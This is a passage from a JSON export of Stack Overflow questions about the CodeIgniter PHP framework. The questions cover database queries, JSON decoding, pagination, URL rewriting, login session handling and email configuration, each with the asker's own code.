\n</code></pre>\n\n<p>Well I haven't displayed the whole return but this is supposed to have a 7 rows which all has a strange 1 character returns (next row contains full of S). I can't tell where the problem really is since when I use </p>\n\n<pre><code>$data['test']=$data['events']['event_name'];\n</code></pre>\n\n<p>in my controller and displays it on my view  the event name displays but only the first row data is repeating 7 times. Well I just need to solve this so that I can move on. Thanks!</p>\n"},{"tags":["php","mysql","codeigniter","escaping"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":13106178,"title":"CodeIgniter escaping query with ActiveRecord.. don't want it to","body":"<p>I have this code:</p>\n\n<pre><code>$f-&gt;like(\"items\", \"&lt;id&gt;###&lt;/id&gt;\", \"both\");\n</code></pre>\n\n<p>When I <code>print_r</code> the database/query object, it just shows <code>%###%</code> and completely removes the <code>IDs</code>.  Is there any way to fix this?  </p>\n\n<p>I've tried escaping the <code>&lt;</code> and <code>&gt;</code> with <code>\\</code> and but to no avail.</p>\n"},{"tags":["mysql","codeigniter","active"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13106099,"title":"Selecting with function in codeigniter active records without using the $this->db->query()","body":"<p>Hi I'm starting to query my database in codeigniter and everything is working fine on a basic select statement but after I added my sql functions everything turns down. Well basically I have a function to Propercase text in mysql which  supposed to work like this:</p>\n\n<pre><code>SELECT proper(foo_bar) as foo from foo;\n</code></pre>\n\n<p>this one should return something like this:</p>\n\n<pre><code>|Foo    |\n|Foo Bar|\n</code></pre>\n\n<p>Now applying the active records I expected it to be like this:</p>\n\n<pre><code>$this-&gt;db-&gt;select('proper(foo_bar)');\n$query = $this-&gt;db-&gt;get('foo');\n</code></pre>\n\n<p>Well I still don't know the part of aliasing but I need to solve this one for now but yes there is no return after this query. I think the CI read it as</p>\n\n<pre><code>Select 'proper(foo_bar)' from foo\n</code></pre>\n\n<p>which is obviously totally wrong. \nAnd by the way, as much as possible I don't want to manually key in my query like this:</p>\n\n<pre><code> $query = $this-&gt;db-&gt;query(\"SELECT proper(foo_bar) as foo from foo\");  \n</code></pre>\n\n<p>that would be impractical in my opinion. Any way to solve this? Thanks!</p>\n"},{"tags":["php","jquery","json","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12911536,"title":"Json_decode with special chars","body":"<p>I got a big problem posting data via jQuery Ajax as JSON to my Server. JSLint say the data is OK and the Content-Type of the request is set to <code>application/x-www-form-urlencoded; charset=UTF-8</code>. Server runs on PHP 5.2.11 so I can't use <code>json_last_error()</code>.</p>\n\n<p>I tried url_decode, utf8_decode and html_entities_decode, but nothing seems to work.</p>\n\n<p><code>var_dump(json_decode($jdata));</code> returns null, but if I do a <code>var_dump($jdata)</code> everything looks OK. <code>$jdata</code> is the post data:<code>$jdata = $this-&gt;input-&gt;post('requestdata');</code>.</p>\n\n<p>Here some example post data grab from Firebug:</p>\n\n<pre><code>{\n    \"projectnumber\": \"345\",\n    \"projecdescription\": \"345\",\n    \"articles\": [\n        {\n            \"position\": 1,\n            \"article_id\": 677,\n            \"online_text\": \"3 Behälter; Band I-III nach indiv. Stückliste, Sprache: DE - Sprache: de\"\n        },\n        {\n            \"position\": 2,\n            \"article_id\": 678,\n            \"online_text\": \"2 Behälter; Band I-III nach indiv. Stückliste, Sprache: ### - Sprache: en\"\n        }\n    ]\n}\n</code></pre>\n\n<p>Edit:</p>\n\n<p>I tried this now:</p>\n\n<pre><code>$string = $this-&gt;input-&gt;post('requestdata');\nvar_dump($string);\n$json = preg_replace('/,\\s*([\\]}])/m', '$1', utf8_encode($string));\n$json = json_decode($json);\nvar_dump($json);\n</code></pre>\n\n<p>The result is:</p>\n\n<blockquote>\n  <p>string(338) \"{\"projectnumber\": \"4444\", \"projecdescription\": \"4444\", \"articles\": [{\"position\":1, \"article_id\": 676, \"online_text\": \"### Behälter; Band I-III nach indiv. Stückliste, Sprache: DE \n   - Sprache: de\"}, {\"position\":2, \"article_id\": 681, \"online_text\": \"### Behälter; Band I-III nach indiv. Stückliste, Sprache: ### \n   - Sprache: en\"}]}\"\n  NULL</p>\n</blockquote>\n\n<p>By pasting the JSON string direct into the PHP source it works, but getting it from post not!</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":93,"score":0,"question_id":12203260,"title":"How get the current view name in CodeIgniter?","body":"<p>How get the name of the current displaying view for pass to another function?</p>\n"},{"tags":["php","excel","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":35,"score":-1,"question_id":13095844,"title":"Reading specific row or column - phpExcel","body":"<p>Using phpExcel, I have managed to read the whole worksheet, is there a way i can read only certain values say from cell C15:C18, to insert them to the databse?</p>\n"},{"tags":["php","jquery","ajax","codeigniter"],"answer_count":6,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1937,"score":0,"question_id":5637539,"title":"CodeIgniter/jQuery - Ajax call returns full html page instead of my echo","body":"<p>In my view I have an ajax call:</p>\n\n<pre><code>    $(\".previous\").click(function() {\n        $.ajax({\n            type: \"POST\",\n            url: \"planner/get_cal\",\n            data: {current_month: current_month},\n            success: function(msg){\n                alert(msg);\n            }\n\n        });\n</code></pre>\n\n<p>the get_cal function in my Planner controller:</p>\n\n<pre><code>function get_cal()\n{\n    echo \"dinosaurs\";\n}\n</code></pre>\n\n<p>However, instead of returning \"dinosaurs\", it returns a full HTML page. I can't figure out why. Thoughts? Thanks a lot.</p>\n"},{"tags":["php","codeigniter","form-helpers"],"answer_count":6,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":8802,"score":1,"question_id":1901703,"title":"Codeigniter form_helper getting database rows to be values in select menu","body":"<p>I know this is going to be really simple once I post it,</p>\n\n<p>I am writing a form, which has a select menu in it, I want the values to pulled from the database, so I thought it would be something along these lines, </p>\n\n<p>My view</p>\n\n<pre><code>&lt;?php\n   echo form_open('admin/save_content');\n   echo form_fieldset();\n   echo form_dropdown('categories', $select_options);\n   echo form_submit('category_submit', 'Submit');\n   echo form_fieldset_close();\n   echo form_close();\n?&gt;\n</code></pre>\n\n<p>My controller</p>\n\n<pre><code>function add_content() {\n\t$data = array();\n\t$this-&gt;is_logged_in();\n\t$this-&gt;load-&gt;model('category_model');\n\t$data['select_options'] = $this-&gt;category_model-&gt;get_all_online();\n\t$this-&gt;load-&gt;view('admin/content/add_content', $data);\n}\n</code></pre>\n\n<p>my model</p>\n\n<pre><code>public function get_all_online() {\n\t$this-&gt;db-&gt;select('*');\n\t$this-&gt;db-&gt;from('category');\n\t$this-&gt;db-&gt;where('category_online', 1);\n\t$query = $this-&gt;db-&gt;get();\n\n\treturn $query-&gt;result();\n\n}\n</code></pre>\n\n<p>now when I place the <code>$selected_options</code> in the form dropdown I get this error,</p>\n\n<blockquote>\n  <p>A PHP Error was encountered</p>\n  \n  <p>Severity: 4096</p>\n  \n  <p>Message: Object of class stdClass\n  could not be converted to string</p>\n  \n  <p>Filename: helpers/form_helper.php</p>\n  \n  <p>Line Number: 331</p>\n</blockquote>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13101265,"title":"Retrieving data from adjacency list model database.(MySQL)","body":"<pre><code>function get_hierarchy_page()\n{\n    $detail = $this-&gt;input-&gt;post('name');\n    $tree = $this-&gt;dashboard_model-&gt;get_detail($detail);\n    $this-&gt;load-&gt;view('layout/layout', $data);\n    if(isset($tree))\n    {\n        $data['hierarchy'] = $this-&gt;data_array_for_teacher($tree);\n\n    }\n\n}\n\nfunction data_array_for_teacher($tree)\n{\n    if(!(isset($tree)))\n    return 0;\n    $data_query = mysql_query(\"select * from tbl_level\");\n    while($result = mysql_fetch_assoc($data_query))\n    {\n        $id = $result['level_id'];\n        $data_array[$id] = $result;\n        }\n\n    //array to get level id\n    while($level_result = mysql_fetch_assoc($tree))\n    {\n            $level_array[] = $level_result['level_id'];\n        }\n    if(!(isset($level_array)))\n    return 0;\n    foreach($level_array as $level)\n    {\n    $p   = $this-&gt;recursive_for_teacher($data_array,$level);    \n    print_r($p);\n    }\n}\n\nfunction recursive_for_teacher($data_array,$level_once)\n{\n    if(!isset($data_array,$level_once))\n    return 0;\n    $i = 0;\n    static $p = array();\n    $data = $data_array;\n    $y = $level_once;\n    $x = $data[$y]['level_parent'];\n    $z = $data[$y]['level_name'];\n    $y=$x;\n    array_push($p,$z);\n    $p[] = $z;\n    if($y!=0)\n    $this-&gt;recursive_for_teacher($data,$y);\n    return $p;\n}\n</code></pre>\n\n<p>I am working on a system which is based on hierarchical data stored in mysql using adjacency list model. I have 2 tables <code>tbl_user</code> and <code>tbl_level</code>. <br><code>tbl_level</code> has the following fields -<code>level_id</code>,<code>level_parent</code>,<code>level_name</code>. These three fields are the same as <code>id</code>,<code>parent_name</code>,<code>parent_id</code> respectively in a standard database structure.<br></p>\n\n<p>In the table <code>tbl_level</code> there are many organizations and each one has different hierarchical structures.<br>\nI wrote the above code which solves my problem of getting the the whole hierarchy of any authority in  a given organization.<br>\nThe only problem which i am now facing is when i am  getting the required answer in one array.<br>\nI need one array for each authority.<br>\n<code>Array(</code>\n    <br><code>[0] =&gt; Engineering and Technology</code><br>\n    <code>[1] =&gt; Univ1</code><br>\n    <code>[2] =&gt; Class</code><br>\n    <code>[3] =&gt; Master of Business Administration</code><br>\n    <code>[4] =&gt; Engineering and Technology</code><br>\n    <code>[5] =&gt; univ1</code><br>\n    <code>[6] =&gt; Class_cse</code><br>\n    <code>[7] =&gt; Computer Science</code><br>\n    <code>[8] =&gt; Bachelor of Technology</code><br>\n    <code>[9] =&gt; Engineering and Technology</code><br>\n    <code>[10] =&gt; univ1</code><br>\n<code>)</code></p>\n\n<p>Can anyone suggest a better solution for the problem ?</p>\n"},{"tags":["php","codeigniter","http-headers","cache-control"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":13099805,"title":"Clear cache on back press to prevent going back on login page or previous page after logout","body":"<p>this is bugging me for a week already. Well I just badly needed to clear the cache of the login page after the user successfully logged in and prevent user from viewing the previous page after logging out when the back button is pressed. I tried adding this codes up in my work (both index page and the login page) in codeigniter but still nothing happens</p>\n\n<pre><code>header(\"Cache-Control: no-cache, must-revalidate\");\nheader(\"Expires: Mon, 26 Jul 1997 05:00:00 GMT\");\nheader(\"Pragma: no-cache\");\n</code></pre>\n\n<p>as well as this one:</p>\n\n<pre><code>&lt;META HTTP-EQUIV=\"CACHE-CONTROL\" CONTENT=\"NO-CACHE\"&gt;\n&lt;META HTTP-EQUIV=\"EXPIRES\" CONTENT=\"01 Jan 1970 00:00:00 GMT\"&gt;\n&lt;META HTTP-EQUIV=\"PRAGMA\" CONTENT=\"NO-CACHE\"&gt;\n</code></pre>\n\n<p>Im already thinking about an ansynchronous task to run in background to check the session but well I'm not that good in AJAX. Well what I just wanted is to make it as simple as the ruby on rails done using <code>Cache-Control: no-cache</code>. By the way I also don't have the knowledge on ruby but seeing that code makes me wonder why there is no simple solution like that in codeigniter? Any solution to do the trick for this one?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":192,"score":1,"question_id":11625458,"title":"Integrate phpgrid with codeigniter","body":"<p>Im trying to integrate <a href=\"http://phpgrid.com\" rel=\"nofollow\">phpgrid</a>  with my codeigniter program.</p>\n\n<p>I need a few clarifications on how to use the library function.</p>\n\n<p>I have added the phpgrid files to the application/libraries path and I have loaded the libray using <code>$this-&gt;load-&gt;library('phpGrid');</code></p>\n\n<p>Below is the code in the phpgrid conf.php file.</p>\n\n<pre><code>&lt;?php\n// mysql example\ndefine('DB_HOSTNAME','localhost'); // database host name\ndefine('DB_USERNAME', 'admin');     // database user name\ndefine('DB_PASSWORD', 'pop3'); // database password\ndefine('DB_NAME', xtra); // database name     \ndefine('DB_TYPE', 'mysql');  // database type\ndefine('DB_CHARSET','utf8'); // ex: utf8(for mysql),AL32UTF8 (for oracle), leave blank to use the default charset\n\n\ndefine('SERVER_ROOT', '/grid');\n\n/******** DO NOT MODIFY ***********/\nrequire_once('phpGrid.php');     \n/**********************************/\n?&gt;\n</code></pre>\n\n<p>Can someone please help me how can I reference the define and require_once files to my library path?</p>\n\n<p>Or is there any other way that I can include the phpgrid files to my CI project?</p>\n"},{"tags":["javascript","api","codeigniter","rest"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":884,"score":1,"question_id":7000953,"title":"Beginner problem with CodeIgniter REST_Controller","body":"<p>I'm trying to setup a REST API in Codeigniter following this example: \n<a href=\"http://net.tutsplus.com/tutorials/php/working-with-restful-services-in-codeigniter-2/\" rel=\"nofollow\">http://net.tutsplus.com/tutorials/php/working-with-restful-services-in-codeigniter-2/</a></p>\n\n<p>But before anything, I want to make sure I can invoke the user_get() function with calling</p>\n\n<p><a href=\"http://mysite.com/myApp/index.php/helloworld/user/id/1/format/json\" rel=\"nofollow\">http://mysite.com/myApp/index.php/helloworld/user/id/1/format/json</a></p>\n\n<p>and I thought the outcome would be a simple \"user_get called\"</p>\n\n<pre><code>  &lt;?php\nrequire(\"application/libraries/REST_Controller.php\");\n\nclass Helloworld extends REST_Controller{\n\n    function user_get()\n    {\n        echo \"user_get called\";\n    }\n}\n    ?&gt;\n</code></pre>\n\n<p>But instead, I got this error: \nAn Error Was Encountered\nUnable to load the requested class: format</p>\n\n<p>What was wrong?\nThanks!!</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":13023676,"title":"Redirect logged in user to home page when back button is pressed after login","body":"<p>I'm currently learning the basics of MVC using codeigniter as my framework and I created a login page. Now I already redirected a user after he logged in and stored a session data but the problem is after I log in (where in I redirected into another page) then pressed the back button the login page still displays unless I highlight the URL in the address bar and pressed enter wherein I go back again to the redirected page. Well I'm aware that this is because of the session check I've made but I need a solution on how I can solve it for the user to not go back again to login page unless he logged out. Same thing for logged out user not to go back to a certain page unless he/she logs in again. </p>\n\n<p>To give a more details what exactly I wanted to happen is just like in facebook login wherein after you logged in and clicked the back button on browser the facebook will still redirect you to your homepage and not on the login page. samething goes to logout.</p>\n\n<p>Well here's my controller so far I think this explains it all. Please do correct me if I made some redundancies in my code and understand that I'm a newbie on this. :)</p>\n\n<pre><code>public function index()\n{\n    $data['error'] = null;\n    $username = $this-&gt;input-&gt;post('username');\n    $password = $this-&gt;input-&gt;post('password');\n    $data['login'] = $this-&gt;login_model-&gt;get_login_credentials($username,$password);\n    $data['session'] = $this-&gt;login_model-&gt;get_session($username);\n\n\n    //CHECK IF THE $PAGE VIEW IS EXISTING\n    if ( ! file_exists('application/views/pages/login.php'))\n    {\n        // IF PAGE DOESN'T EXISTS SHOW 404 ERROR\n        show_404();\n    }\n\n    if(($this-&gt;input-&gt;post('login')=='Login'&amp;&amp;$data['login']==1)||($username==$data['session']['username'])){\n        //SUCCESS LOGIN\n        $this-&gt;load-&gt;helper('url');  \n        redirect('news');\n    }\n\n    if($this-&gt;input-&gt;post('login')=='Login'&amp;&amp;$data['login']!=1){\n        //LOGIN FAILED\n        $data['error'] = \"Invalid login credentials.\";\n    }\n\n\n    //FOR THE TITLE PART\n    $data['title'] = ucfirst('login'); \n\n    $this-&gt;load-&gt;view('pages/login/login', $data);\n    $this-&gt;load-&gt;view('templates/footer', $data);\n\n}\n</code></pre>\n"},{"tags":["php","apache","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":13092041,"title":"remove index.php in url using CodeIgniter","body":"<p>I'm developing an application based on Ubuntu &amp; Apache2 &amp; CodeIgniter</p>\n\n<p>I've a controller named <code>Site</code> like this</p>\n\n<pre><code>class Site extends CI_Controller {\n    public function view($page = 'home')\n    {\n        $this-&gt;load-&gt;view('site/'.$page, $data);\n    }\n}\n</code></pre>\n\n<p>in <code>application/views/site</code> I have <code>home.php</code> &amp; <code>about.php</code></p>\n\n<p><code>localhost/index.php/about</code> works well<br>\nbut <code>localhost/about</code> gets<br>\n<code>Not Found,The requested URL /about was not found on this server.</code></p>\n\n<p>I've already</p>\n\n<ol>\n<li>make sure <code>mod_rewrite</code> turned on and <code>AllowOverride All</code> in apache2 config file.</li>\n<li><code>$config['index_page'] = '';</code> in <code>application/config/config.php</code></li>\n</ol>\n\n<p>I've also set route to  </p>\n\n<pre><code>$route['default_controller'] = \"site/view\";  \n$route['404_override'] = '';   \n$route['(:any)'] = \"site/view/$1\";\n</code></pre>\n\n<p>Here's my <code>.htaccess</code>:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ index.php/$1 [L]  \n\n&lt;Files \"index.php\"&gt;\nAcceptPathInfo On\n&lt;/Files&gt;  \n</code></pre>\n"},{"tags":["php","codeigniter","pagination","segment"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13098837,"title":"SOLVED - Pagination, next page doesn`t display","body":"<p><strong>SOLVED!</strong></p>\n\n<p>if I click page 2 that`s error:</p>\n\n<blockquote>\n  <p>Not Found\n  The requested URL /rank/GetAll/30 was not found on this server.</p>\n</blockquote>\n\n<p>My link is:</p>\n\n<pre><code>http://localhost/rank/GetAll/30\n</code></pre>\n\n<p>Model: Rank_Model</p>\n\n<pre><code>&lt;?php\n Class Rank_Model extends CI_Model {\n\n  public function __construct() {\n   parent::__construct();\n  }\n\n  public function record_count() {\n   return $this-&gt;db-&gt;count_all(\"ranking\");\n  }\n\n  public function fifa_rank($limit, $start) {\n   $this-&gt;db-&gt;limit($limit, $start);\n   $query = $this-&gt;db-&gt;get(\"ranking\");\n\n   if ($query-&gt;num_rows() &gt; 0) {\n        foreach ($query-&gt;result() as $row) {\n          $data[] = $row;\n        }\n        return $data;\n      }\n      return false;\n   }\n }\n\n ?&gt;\n</code></pre>\n\n<p>Controller: Rank</p>\n\n<pre><code>&lt;?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');\n\nclass rank extends CI_Controller {\n\n function __construct()\n {\n   parent::__construct();\n  $this-&gt;load-&gt;helper(\"url\");\n   $this-&gt;load-&gt;helper(array('form', 'url'));\n   $this-&gt;load-&gt;model('Rank_Model','',TRUE);\n  $this-&gt;load-&gt;library(\"pagination\");\n\n }\n\n function GetAll() {\n $config = array();\n $config[\"base_url\"] = base_url() . \"rank/GetAll\";\n $config[\"total_rows\"] = $this-&gt;Rank_Model-&gt;record_count();\n $config[\"per_page\"] = 30;\n $config[\"uri_segment\"] = 3;\n\n $this-&gt;pagination-&gt;initialize($config);\n\n $page = ($this-&gt;uri-&gt;segment(3)) ? $this-&gt;uri-&gt;segment(3) : 0;\n $data[\"results\"] = $this-&gt;Rank_Model-&gt;fifa_rank($config[\"per_page\"], $page);\n $data['errors_login'] = array();\n $data[\"links\"] = $this-&gt;pagination-&gt;create_links();\n\n $this-&gt;load-&gt;view('left_column/open_fifa_rank',$data);\n }\n}\n</code></pre>\n\n<p>View Open: open_fifa_rank</p>\n\n<pre><code>&lt;?php\n$this-&gt;load-&gt;view('mains/header');\n$this-&gt;load-&gt;view('login/loggin');\n$this-&gt;load-&gt;view('mains/menu');\n$this-&gt;load-&gt;view('left_column/left_column_before');\n$this-&gt;load-&gt;view('left_column/menu_left');\n$this-&gt;load-&gt;view('left_column/left_column');\n$this-&gt;load-&gt;view('center/center_column_before');\n$this-&gt;load-&gt;view('left_column/fifa_rank');\n$this-&gt;load-&gt;view('center/center_column');\n$this-&gt;load-&gt;view('right_column/right_column_before');\n$this-&gt;load-&gt;view('login/zaloguj');\n$this-&gt;load-&gt;view('right_column/right_column');\n$this-&gt;load-&gt;view('mains/footer');\n?&gt;\n</code></pre>\n\n<p>and View: fifa_rank</p>\n\n<pre><code>&lt;table&gt;\n &lt;thead&gt;\n   &lt;tr&gt;\n   &lt;td&gt;Pozycja&lt;/td&gt;\n   &lt;td&gt;Kraj&lt;/td&gt;\n   &lt;td&gt;Punkty&lt;/td&gt;\n   &lt;td&gt;Zmiana&lt;/td&gt;\n   &lt;/tr&gt;\n &lt;/thead&gt;\n\n&lt;?php\n foreach($results as $data) {?&amp;gt;\n  &lt;tbody&gt;\n   &lt;tr&gt;\n   &lt;td&gt;&lt;?php print $data-&gt;pozycja;?&gt;&lt;/td&gt;\n   &lt;td&gt;&lt;?php print $data-&gt;kraj;?&gt;&lt;/td&gt;\n   &lt;td&gt;&lt;?php print $data-&gt;punkty;?&gt;&lt;/td&gt;\n   &lt;td&gt;&lt;?php print $data-&gt;zmiana;?&gt;&lt;/td&gt;\n   &lt;/tr&gt;\n&lt;?php } ?&gt;\n\n&lt;/tbody&gt;\n&lt;/table&gt;\n\n&lt;p&gt;&lt;?php echo $links; ?&gt;&lt;/p&gt;\n</code></pre>\n\n<p>Maybe you know where is my problem?</p>\n\n<p>Now I know where is my problem.\nIn first page I have link:</p>\n\n<pre><code>http://localhost/index.php/rank/GetAll\n</code></pre>\n\n<p>But on the next:</p>\n\n<pre><code>http://localhost/rank/GetAll/30\n</code></pre>\n\n<p>In secend link, I don`t have index.php. How can I fix it?</p>\n\n<p>In $config[\"base_url\"] = base_url() . \"rank/GetAll\";\nI add :\n$config[\"base_url\"] = base_url() . \"index.php/rank/GetAll\";</p>\n\n<p>And it`s ok :)</p>\n"}]}
{"total":13987,"page":5,"pagesize":100,"questions":[{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13090329,"title":"Codeigniter 2.1 - character replace","body":"<p>I have a felling that something is trolling me. I have this two functions. Purpose is to replace characters, but something is not working. Name of the file is changed, but only <strong>space</strong> (\" \") is changed to <strong>_</strong> character (there are no more str_replace functions).\nWhat is wrong?</p>\n\n<p><strong>EDIT</strong>\n**char_replace** is found in separate library file which is not extending controller.\nI am using <strong>char_replace</strong> function to replace data coming from <strong>input type=text</strong> and it is working (function is being called from different controller).</p>\n\n<pre><code>function img_upload($folder) {\n        $this-&gt;path = './public/img/' . $folder;\n        $imgs = array();\n        $config = array(\n            'allowed_types' =&gt; 'jpg|jpeg|png|gif',\n            'upload_path' =&gt; $this-&gt;path\n        );\n\n        $this-&gt;CI-&gt;load-&gt;library('upload', $config);\n\n        foreach ($_FILES as $key =&gt; $value) {\n            $img_name = $this-&gt;char_replace($key-&gt;name, '_');\n            $config['file_name'] = $img_name;\n          if($key != 'logo') :\n              if (!$this-&gt;CI-&gt;upload-&gt;do_upload($key)) {\n            } else {\n                $q = $this-&gt;CI-&gt;upload-&gt;data();\n                $config['image_library'] = 'gd2';\n                $config['source_image'] = $this-&gt;path . '/' . $q['file_name'];\n                $config['new_image'] = $this-&gt;path . '/thumbs';\n                $config['create_thumb'] = FALSE;\n                $config['maintain_ratio'] = TRUE;\n                $config['width'] = 128;\n                $config['height'] = 128;\n\n                $this-&gt;CI-&gt;load-&gt;library('image_lib');\n                $this-&gt;CI-&gt;image_lib-&gt;clear();\n                $this-&gt;CI-&gt;image_lib-&gt;initialize($config);\n                $this-&gt;CI-&gt;image_lib-&gt;resize();\n                array_push($imgs, $q['file_name']);\n            }\n          endif;\n        }\n\n        if(empty($imgs)){\n            return FALSE;\n        } else {\n            return implode(',', $imgs);\n        }\n    }\n</code></pre>\n\n<p>And this one:</p>\n\n<pre><code>function char_replace($text, $rep_simbol = \" \")\n    {\n        $char = array('!', '&amp;', '?', '/', '/\\/', ':', ';', '#', '&lt;', '&gt;', '=', '^', '@', '~', '`', '[', ']', '{', '}');\n        return $name = str_replace($char, $rep_simbol, $text);\n    }\n</code></pre>\n"},{"tags":["php","codeigniter","session"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13098609,"title":"How to solve a session expiration issue","body":"<p>I am doing a site which has a problem with session expire issue. The form contain almost 50 input fields , I have done it in ajax. I have given the user checkings in page reload the problem is that session and cookies are setting is done when page reloads,</p>\n\n<p>How can I check whether user logined or not without lossing data? Is there any ajax functions\nto retain session?</p>\n"},{"tags":["codeigniter","pyrocms"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":478,"score":0,"question_id":6045901,"title":"Module Plugin on PyroCMS is not loading","body":"<p>I have created a module that works on the administrator and public side. On the public side, I want to have a plugin for certain parts which I can put into the pages.</p>\n\n<p>I have done this but it doesn't load after putting in {pyro:properties:rental}</p>\n\n<p>Here is the code in /addons/modules/properties/plugin.php.</p>\n\n<pre><code>&lt;?php defined('BASEPATH') OR exit('No direct script access allowed');\n\nclass Plugin_Properties extends Plugin\n{\nfunction rental()\n{           \n        $rentalForm = '&lt;div class=\"search_full\"&gt;\n        &lt;div class=\"container_12\"&gt;\n            &lt;div class=\"grid_12\"&gt;\n                &lt;h1&gt;Rental Search&lt;/h1&gt;\n            &lt;/div&gt;\n            &lt;form action=\"\" method=\"post\"&gt;\n            &lt;div class=\"grid_4\"&gt;\n                &lt;h2 class=\"liberationtext\"&gt;Choose your destination&lt;/h2&gt;\n\n                &lt;label for=\"region\"&gt;Region&lt;/label&gt;\n\n            &lt;/div&gt;\n            &lt;/form&gt;\n       &lt;/div&gt;\n    &lt;/div&gt;';\n    return $rentalForm;\n    }\n}\n</code></pre>\n\n<p>The module is called properties and the plugin just returns some HTML to display.</p>\n\n<p>When I look at the log, it says ERROR - 2011-05-18 13:53:57 --> Unable to load: properties</p>\n\n<p>I made this into a plugin (in the plugins folder) and it worked fine when I called it. I'm not sure what to do. Any help would be good.</p>\n"},{"tags":["php","codeigniter","smtp","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":13077795,"title":"CodeIgniter tankauth not working with GMail","body":"<p>I've WAMP server setup on local dev environment (php_openssl extension enabled). I installed Code Igniter and trying to configure TankAuth, where I want to use GMail (actually Google Apps) to send test mails.</p>\n\n<p>I went through following URLs for configuration</p>\n\n<ul>\n<li><a href=\"http://codeigniter.com/forums/viewthread/84689/P15\" rel=\"nofollow\">http://codeigniter.com/forums/viewthread/84689/P15</a> (comment 30 for CI2)</li>\n<li><a href=\"http://stackoverflow.com/questions/3422564/sending-email-to-gmail-with-codeigniter-displays-message-sent-but-there-nothin\">Sending email to gmail with CodeIgniter displays &quot;message sent&quot; but there nothing in the inbox?</a></li>\n<li><a href=\"http://stackoverflow.com/questions/600725/how-to-configure-wamp-localhost-to-send-email-using-gmail\">How to configure WAMP (localhost) to send email using Gmail?</a></li>\n</ul>\n\n<p>Based on input from above, I updated <code>_send_email</code> function of tank auth as follow</p>\n\n<pre><code>function _send_email($type, $email, &amp;$data)\n{\n    $this-&gt;load-&gt;library('email');\n\n    $config['protocol'] = \"smtp\";\n    $config['smtp_host'] = \"ssl://smtp.googlemail.com\";\n    $config['smtp_port'] = \"465\";\n    $config['smtp_user'] = \"mymail@youthpark.org\";//also valid for Google Apps Accounts\n    $config['smtp_pass'] = \"mypass\";\n    $config['charset'] = \"utf-8\";\n    $config['mailtype'] = \"html\";\n    $config['newline'] = \"\\r\\n\";\n\n    $this-&gt;email-&gt;initialize($config); \n\n    $this-&gt;email-&gt;from($this-&gt;config-&gt;item('webmaster_email', 'tank_auth'), $this-&gt;config-&gt;item('website_name', 'tank_auth'));\n    $this-&gt;email-&gt;reply_to($this-&gt;config-&gt;item('webmaster_email', 'tank_auth'), $this-&gt;config-&gt;item('website_name', 'tank_auth'));\n    $this-&gt;email-&gt;to($email);\n    $this-&gt;email-&gt;subject(sprintf($this-&gt;lang-&gt;line('auth_subject_'.$type), $this-&gt;config-&gt;item('website_name', 'tank_auth')));\n    $this-&gt;email-&gt;message($this-&gt;load-&gt;view('email/'.$type.'-html', $data, TRUE));\n    $this-&gt;email-&gt;set_alt_message($this-&gt;load-&gt;view('email/'.$type.'-txt', $data, TRUE));\n    //$this-&gt;email-&gt;send();\n\n    if ( ! $this-&gt;email-&gt;send())\n    {\n        show_error($this-&gt;email-&gt;print_debugger());\n    } else {\n        //echo('DONE');        \n    } \n}\n</code></pre>\n\n<p>I'm getting message <code>mail sent..</code> but actually mail was not sent. Can someone please point-out where I'm doing the mistake?</p>\n\n<p><strong>Popup is also enabled in GMail settings</strong></p>\n"},{"tags":["ajax","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13097276,"title":"How would i Execute ajax validation in two database?one is API database and the other is a local one","body":"<p>I have this in my controller function in my view a typical username and password input form</p>\n\n<pre><code>public function login() {\n    $username = $_POST['username'];\n    $password = md5($_POST['password']);\n    //if user dont exist in the in the local database it will be validated thru the API\n    if(!$this-&gt;is_registered_email($_POST['username'])) {\n        $ret = file_get_contents('http://www.XXXXd48170846c1e937640ae7e9f6743089c3c2a9074/auth/{\"user\":\"' . $username . '\",\"pass\":\"' . $password . '\"}');\n        $ret = json_decode($ret);\n    } else {\n        //this is where if the user exist in the local database and in the API database\n        // and if the user input a wrong password\n\n    }\n    //this will return user details from the API if the user exists\n    $data = array('response' =&gt; $ret);\n\n}\n</code></pre>\n\n<p>i added the comment to the process</p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":76,"score":-4,"question_id":12991089,"title":"How to use this query to compare with array values","body":"<p><code>SELECT DISTINCT email FROM table 1, table2                                  WHERE email = array value 